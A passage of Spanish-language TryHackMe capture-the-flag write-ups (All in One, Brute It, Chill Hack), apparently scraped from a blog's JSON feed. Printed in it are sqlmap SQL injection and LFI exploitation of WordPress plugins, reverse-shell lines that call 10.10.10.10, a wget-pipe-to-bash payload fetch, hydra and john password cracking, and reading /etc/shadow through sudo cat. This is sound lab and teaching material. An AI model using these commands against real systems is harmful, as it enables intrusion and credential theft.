https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://allinone.thm/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://allinone.thm/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://allinone.thm/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01). | Found By: Rss Generator (Passive Detection) | - http://allinone.thm/wordpress/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.5.1\u0026lt;/generator\u0026gt; | - http://allinone.thm/wordpress/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.5.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://allinone.thm/wordpress/wp-content/themes/twentytwenty/ | Last Updated: 2020-12-09T00:00:00.000Z | Readme: http://allinone.thm/wordpress/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 1.6 | Style URL: http://allinone.thm/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.5 (80% confidence) | Found By: Style (Passive Detection) | - http://allinone.thm/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: \u0026#39;Version: 1.5\u0026#39; [i] Plugin(s) Identified: [+] mail-masta | Location: http://allinone.thm/wordpress/wp-content/plugins/mail-masta/ | Latest Version: 1.0 (up to date) | Last Updated: 2014-09-19T07:52:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://allinone.thm/wordpress/wp-content/plugins/mail-masta/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://allinone.thm/wordpress/wp-content/plugins/mail-masta/readme.txt [+] reflex-gallery | Location: http://allinone.thm/wordpress/wp-content/plugins/reflex-gallery/ | Latest Version: 3.1.7 (up to date) | Last Updated: 2019-05-10T16:05:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 3.1.7 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://allinone.thm/wordpress/wp-content/plugins/reflex-gallery/readme.txt [i] User(s) Identified: [+] elyana | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://allinone.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) Los plugins identificados tienen vulnerabilidades las cuales permiten obtener informacion de la base de datos, subir y leer archivos.\nWordPress Plugin Mail Masta 1.0 - SQL Injection\nWordPress Plugin Mail Masta 1.0 - Local File Inclusion\nWordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload\nSQLI - Mail Masta Utilizando SQLMAP logramos obtener las credenciales del usuario elyana de la base de datos de wordpress.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #sqlmap -u \u0026#34;http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1\u0026amp;pl=/var/www/html/wordpress/wp-load.php\u0026#34; -p list_id --dbs available databases [2]: [*] information_schema [*] wordpress Database: wordpress [23 tables] +----------------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_masta_campaign | | wp_masta_cronapi | | wp_masta_list | | wp_masta_reports | | wp_masta_responder | | wp_masta_responder_reports | | wp_masta_settings | | wp_masta_subscribers | | wp_masta_support | | wp_options | | wp_postmeta | | wp_posts | | wp_reflex_gallery | | wp_reflex_gallery_images | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +----------------------------+ Database: wordpress Table: wp_users [1 entry] +------+--------------------------------+------------------------------------+---------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +------+--------------------------------+------------------------------------+---------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | 1 | http://192.168.8.110/wordpress | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | none@none.com | elyana | 0 | elyana | elyana | 2020-10-05 19:55:50 | \u0026lt;blank\u0026gt; | +------+--------------------------------+------------------------------------+---------------+------------+-------------+--------------+---------------+---------------------+---------------------+ LFI - Mail Masta Utilizando el \u0026ldquo;proof\u0026rdquo; para Mail Masta logramos leer el archivo wp-config.php en base64, donde vemos las credenciales de la base de datos y configuraciones de wordpress.\n1 http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php WWW-DATA - USER Utilizamos la contraseña y usuario que encontramos en el panel de wordpress donde pudimos obtener acceso y mediante el editor de temas, agregamos una shell inversa al archivo 404.php del tema actual. Con netcat a la escucha logramos obtener una shell con usuario www-data al provocar un error 404.php agregando una letra en la url del unico post.\nRealizamos una pequeña enumeracion en la carpeta donde se encuentra la pagina de wordpress y encontramos un mensaje en una pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 bash-4.4$ ls -lah ls -lah total 28K drwxr-xr-x 3 root root 4.0K Oct 5 20:11 . drwxr-xr-x 3 root root 4.0K Oct 5 19:43 .. -rw-r--r-- 1 root root 197 Oct 5 20:11 hackathons -rwxr-xr-x 1 root root 11K Oct 5 19:44 index.html drwxr-xr-x 5 www-data www-data 4.0K Oct 5 19:59 wordpress bash-4.4$ cat hackathons cat hackathons \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Damn how much I hate the smell of \u0026lt;i\u0026gt;Vinegar \u0026lt;/i\u0026gt; :/ !!! \u0026lt;/h1\u0026gt; \u0026lt;!-- Dvc W@iyur@123 --\u0026gt; \u0026lt;!-- KeepGoing --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; PRIVILEGE ESCALATION Hacemos una pequeña enumeracion al archivo /etc/crontab y vemos que existe un cron que ejecuta a cada minuto el archivo /var/backups/script.sh con usuario root, además este archivo es editable por cualquier usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 bash-4.4$ cat /etc/crontab [... snip ...] # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * root /var/backups/script.sh bash-4.4$ cat /var/backups/script.sh cat /var/backups/script.sh #!/bin/bash #Just a test script, might use it later to for a cron task bash-4.4$ ls -lah /var/backups/script.sh ls -lah /var/backups/script.sh -rwxrwxrwx 1 root root 73 Oct 7 13:37 /var/backups/script.sh bash-4.4$ Tambien encontramos ejecutables con permisos SUID.\nbash-4.4$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah\rfind / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah\r-rwsr-sr-x 1 root root 1.1M Jun 6 2019 /bin/bash\r-rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount\r-rwsr-xr-x 1 root root 43K Sep 16 18:43 /bin/mount\r-rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping\r-rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su\r-rwsr-xr-x 1 root root 27K Sep 16 18:43 /bin/umount\r-rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at\r-rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn\r-rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh\r-rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd\r-rwsr-sr-x 1 root root 11M Nov 23 2018 /usr/bin/lxc\r-rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap\r-rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp\r-rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap\r-rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd\r-rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec\r-rwsr-sr-x 1 root root 392K Apr 4 2018 /usr/bin/socat\r-rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo\r-rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils\r-rwsr-xr-- 1 root messagebus 42K Jun 11 18:25 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device\r-rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign\r-rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1\r-rwsr-xr-x 1 root root 111K Jul 10 14:00 /usr/lib/snapd/snap-confine\r-rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic SUID Ejecutamos bash -p y logramos obtener una shell root y nuestras flags.\nCRON Agregamos un comando al archivo script.sh para ejecutar una shell inversa.\n1 echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; /var/backups/script.sh Luego, ejecutamos netcat y logramos obtener una shell con usuario root y nuestras flags: user.txt y root.txt.\n","description":"All in One es una maquina de TryHackMe, una vulnerabilidad SQLi y LFI en WordPress nos permitio obtener credenciales las cuales utilizamos en el panel, seguidamente ejecutamos una shell inversa. Finalmente obtuvimos acceso root mediante bash y un script perteneciente a la lista de crontab.","id":83,"section":"posts","tags":["suid","ftp","cron","wordpress","wpscan"],"title":"TryHackMe - All in One","uri":"https://sckull.github.io/posts/allinone/"},{"content":"\rBrute It es una maquina de TryHackMe, fuerza bruta y ssh2john nos dio aceso a la maquina. Utilizando GTFOBins y cat obtuvimos nuestra flag root.txt y escalamos privilegios.\nRoom Titulo Brute It Descripción Learn how to brute, hash cracking and escalate privileges in this box! Puntos 730 Dificultad Facil Maker ReddyyZ NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Nmap 7.80 scan initiated Wed Dec 9 19:56:37 2020 as: nmap -p- --min-rate 1000 -o allPorts brute.thm Nmap scan report for brute.thm (10.10.192.18) Host is up (0.36s latency). Not shown: 64739 closed ports, 794 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Wed Dec 9 19:59:02 2020 -- 1 IP address (1 host up) scanned in 146.01 seconds # Nmap 7.80 scan initiated Wed Dec 9 19:59:55 2020 as: nmap -p 22,80 -sV -sC -o servicePorts brute.thm Nmap scan report for brute.thm (10.10.192.18) Host is up (0.36s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA) | 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA) |_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 9 20:00:15 2020 -- 1 IP address (1 host up) scanned in 19.99 seconds HTTP Encontramos la pagina web de apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 kali@kali:~/thm/bruteit$ gobuster dir -u http://brute.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /admin (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) Encontramos un panel de logeo, en el codigo fuente encontramos dos posibles nombres de usuario.\n1 2 3 4 5 \u0026lt;/div\u0026gt; \u0026lt;!-- Hey john, if you do not remember, the username is admin --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; HYDRA Utilizamos hydra con el usuario admin y el wordlist rockyou.txt para lograr encontrar la contraseña para este usuario.\nIngresamos con las credenciales en el panel y logramos ver el contenido: la primera flag y una clave privada RSA encriptada.\nSSH2JOHN Utilizamos ssh2john para obtener el hash y obtener con john la frase en texto plano de la clave privada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kali@kali:~/thm/bruteit$ /usr/share/john/ssh2john.py rsa_encripted \u0026gt; rsa_hash kali@kali:~/thm/bruteit$ john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status r[ ... snip ... ]l (rsa_encripted) 1g 0:00:00:04 DONE (2020-12-09 20:16) 0.2096g/s 3006Kp/s 3006Kc/s 3006KC/sa6_123..*7¡Vamos! Session completed kali@kali:~/thm/bruteit$ JOHN - USER Utilizando la clave privada y la frase con el usuario en el servicio SSH logramos obtener una shell y nuestra flag user.txt.\n1 2 kali@kali:~/thm/bruteit$ chmod 600 rsa_encripted kali@kali:~/thm/bruteit$ ssh john@brute.thm -i rsa_encripted PRIVILEGE ESCALATION Realizamos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos \u0026ldquo;root\u0026rdquo; para ejecutar el comando cat. Utilizamos este comando para obtener la flag root.txt.\nGFOBins - cat\n1 FLAG=/root/root.txt; sudo cat \u0026#34;$FLAG\u0026#34; Utilizamos cat para leer el contenido de /etc/shadow para obtener el hash del usuario root y con john poder obtener la contraseña en texto plano y poder obtener una shell con este usuario.\n1 2 3 4 5 6 john@bruteit:~$ FLAG=/etc/shadow; sudo cat \u0026#34;$FLAG\u0026#34; root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xD[ ... snip ... ]1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: daemon:*:18295:0:99999:7::: bin:*:18295:0:99999:7::: [ ... snip ... ] john@bruteit:~$ 1 2 3 4 5 6 7 8 9 10 11 kali@kali:~/thm/bruteit$ john --wordlist=/usr/share/wordlists/rockyou.txt root_hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status f[ ... snip ... ]l (root) 1g 0:00:00:00 DONE (2020-12-09 20:23) 12.50g/s 3200p/s 3200c/s 3200C/s 123456..freedom Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/thm/bruteit$ Shell con usuario root.\n","description":"","id":84,"section":"posts","tags":["steganography","steghide","docker","sudo privesc","ftp"],"title":"TryHackMe - Brute It","uri":"https://sckull.github.io/posts/bruteit/"},{"content":"\rChill Hack es una maquina de TryHackMe, ejecutamos una shell inversa tras enumerar el sitio web. Obtuvimos acceso al siguiente usuario con un script ejecutado con sudo. Un pequeño reto de esteganografia nos permitio realizar nuevamente movimiento lateral. Finalmente escalamos privilegios utilizando docker.\nRoom Titulo Chill Hack Descripción This room provides the real world pentesting challenges. Puntos 60 Dificultad Facil Maker Anurodh NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 # Nmap 7.80 scan initiated Wed Dec 9 16:52:55 2020 as: nmap -p- --min-rate 1000 -o allPorts chill.thm Nmap scan report for chill.thm (10.10.95.245) Host is up (0.26s latency). Not shown: 63578 closed ports, 1954 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Wed Dec 9 16:55:51 2020 -- 1 IP address (1 host up) scanned in 176.21 seconds # Nmap 7.80 scan initiated Wed Dec 9 16:56:28 2020 as: nmap -p 21,22,80 -sV -sC -o servicePorts chill.thm Nmap scan report for chill.thm (10.10.95.245) Host is up (0.26s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 1001 1001 90 Oct 03 04:33 note.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.29.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA) | 256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA) |_ 256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Game Info Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 9 16:56:45 2020 -- 1 IP address (1 host up) scanned in 16.85 seconds FTP Ingresamos por el servicio FTP con las \u0026ldquo;credenciales\u0026rdquo; de anonymous (anonymous:anonymous), donde encontramos una \u0026ldquo;nota\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 kali@kali:~/thm/chillhack$ ftp chill.thm Connected to chill.thm. 220 (vsFTPd 3.0.3) Name (chill.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 115 4096 Oct 03 04:33 . drwxr-xr-x 2 0 115 4096 Oct 03 04:33 .. -rw-r--r-- 1 1001 1001 90 Oct 03 04:33 note.txt 226 Directory send OK. ftp\u0026gt; get note.txt local: note.txt remote: note.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note.txt (90 bytes). 226 Transfer complete. 90 bytes received in 0.00 secs (34.8772 kB/s) ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; exit 221 Goodbye. 1 Anurodh told me that there is some filtering on strings being put in the command -- Apaar HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos. Vemos que existe una pagina no muy comun (/secret).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 kali@kali:~/thm/chillhack$ gobuster dir -u http://chill.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /about.html (Status: 200) /blog.html (Status: 200) /contact.php (Status: 200) /contact.html (Status: 200) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /news.html (Status: 200) /secret (Status: 301) /server-status (Status: 403) /team.html (Status: 200) kali@kali:~/thm/chillhack$ Al visitar dicha pagina nos muestra un input donde podemos ejecutar comandos, pero algunos comandos estan \u0026ldquo;prohibidos\u0026rdquo; o \u0026ldquo;filtrados\u0026rdquo; como lo dice la nota.\nWWW-DATA Utilizando la pagina para ejecutar comandos, realizamos la ejecucion de una shell inversa, primero creamos un archivo que contenga la ejecucion de la shell, creamos un \u0026ldquo;mini servidor\u0026rdquo; con python (python3 -m http.server 80) y realizamos la ejecucion de nuestra shell con wget.\n1 bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1 wget -qO- http://10.10.10.10/shell.sh|bash Logrando asi obtener una shell con el usuario www-data.\nMYSQL Al realizar una pequeña enumeracion de archivos, encontramos un archivo php que contiene unas credenciales para una base de datos mysql. Asi mismo encontramos en el archivo hacker.php un mensaje Look in the dark! You will find your answer, el cual puede indicar que algo se esconde en algun lugar o archivo(?).\n1 2 3 4 5 6 7 8 9 10 www-data@ubuntu:/var/www/files$ ls -lah ls -lah total 28K drwxr-xr-x 3 root root 4.0K Oct 3 04:40 . drwxr-xr-x 4 root root 4.0K Oct 3 04:01 .. -rw-r--r-- 1 root root 391 Oct 3 04:01 account.php -rw-r--r-- 1 root root 453 Oct 3 04:02 hacker.php drwxr-xr-x 2 root root 4.0K Oct 3 06:30 images -rw-r--r-- 1 root root 1.2K Oct 3 04:02 index.php -rw-r--r-- 1 root root 545 Oct 3 04:07 style.css 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 cat index.php \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php if(isset($_POST[\u0026#39;submit\u0026#39;])) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; ob_start(); session_start(); try { $con = new PDO(\u0026#34;mysql:dbname=webportal;host=localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;[... snip ... ]\u0026#34;); $con-\u0026gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING); } catch(PDOException $e) { exit(\u0026#34;Connection failed \u0026#34;. $e-\u0026gt;getMessage()); } require_once(\u0026#34;account.php\u0026#34;); $account = new Account($con); $success = $account-\u0026gt;login($username,$password); if($success) { header(\u0026#34;Location: hacker.php\u0026#34;); } } ?\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;signInContainer\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;column\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h2 style=\u0026#34;color:blue;\u0026#34;\u0026gt;Customer Portal\u0026lt;/h2\u0026gt; \u0026lt;h3 style=\u0026#34;color:green;\u0026#34;\u0026gt;Log In\u0026lt;h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;?php echo $success?\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34; placeholder=\u0026#34;Username\u0026#34; required\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34; required\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Utilizamos dichas credenciales para poder obtener acceso a la base de datos webportal, donde pudimos obtener credenciales encriptadas de los usuarios: Aurick y cullapaar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 www-data@ubuntu:/var/www/files$ mysql -u root -p mysql -u root -p Enter password: [ ... snip ... ] [ ... snip ... ] mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | webportal | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use webportal; use webportal; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; show tables; +---------------------+ | Tables_in_webportal | +---------------------+ | users | +---------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from users; select * from users; +----+-----------+----------+-----------+----------------------------------+ | id | firstname | lastname | username | password | +----+-----------+----------+-----------+----------------------------------+ | 1 | Anurodh | Acharya | Aurick | 7e53614c[ ... snip ... ]806cc4fd | | 2 | Apaar | Dahal | cullapaar | 68621624[ ... snip ... ]c789a649 | +----+-----------+----------+-----------+----------------------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; Utilizando crackstation.net logramos obtener las contraseñas en texto plano.\nTambien encontramos un puerto local el cual esta \u0026ldquo;enlazado\u0026rdquo; a una pagina web, y esta misma esta dirigida a los archivos de la carpeta /var/www/files donde encontramos las credenciales de la base de datos ẁebportal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 www-data@ubuntu:/$ netstat -ntpl netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::21 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - www-data@ubuntu:/$ www-data@ubuntu:/etc/apache2/sites-enabled$ ls -lah ls -lah total 8.0K drwxr-xr-x 2 root root 4.0K Oct 3 03:44 . drwxr-xr-x 8 root root 4.0K Oct 3 04:44 .. lrwxrwxrwx 1 root root 35 Oct 3 03:44 000-default.conf -\u0026gt; ../sites-available/000-default.conf www-data@ubuntu:/etc/apache2/sites-enabled$ cat 000-default.conf [ ... snip ... ] \u0026lt;VirtualHost *:9001\u0026gt; # The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request\u0026#39;s Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. #ServerName www.example.com ServerAdmin webmaster@localhost DocumentRoot /var/www/files # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with \u0026#34;a2disconf\u0026#34;. #Include conf-available/serve-cgi-bin.conf \u0026lt;/VirtualHost\u0026gt; # vim: syntax=apache ts=4 sw=4 sts=4 sr noet www-data@ubuntu:/etc/apache2/sites-enabled$ APAAR - USER Tambien encontramos que es posible ejecutar el archivo /home/apaar/.helpline.sh utilizando sudo con el usuario apaar. El archivo realiza varias impresiones y obtiene dos valores que se almacenan en las variables $persona y $msg, este ultimo es ejecutado y los errores se envian a /dev/null.\n1 2 3 4 5 6 7 8 9 10 11 12 13 #!/bin/bash echo echo \u0026#34;Welcome to helpdesk. Feel free to talk to anyone at any time!\u0026#34; echo read -p \u0026#34;Enter the person whom you want to talk with: \u0026#34; person read -p \u0026#34;Hello user! I am $person, Please enter your message: \u0026#34; msg $msg 2\u0026gt;/dev/null echo \u0026#34;Thank you for your precious time!\u0026#34; Ejecutamos el archivo y le pasamos un comando en lugar de un mensaje la segunda opcion ($msg) el cual se ejecuta y se muestra en la pantalla.\nPara obtener una shell y la flag user.txt ejecutamos bash.\nSTEGO Enumeramos las carpetas del usuario pero no encontramos nada interesante. Regresamos nuevamente a la carpeta /var/www/files donde encontramos un mensaje interesante. En la misma carpeta encontramos dos 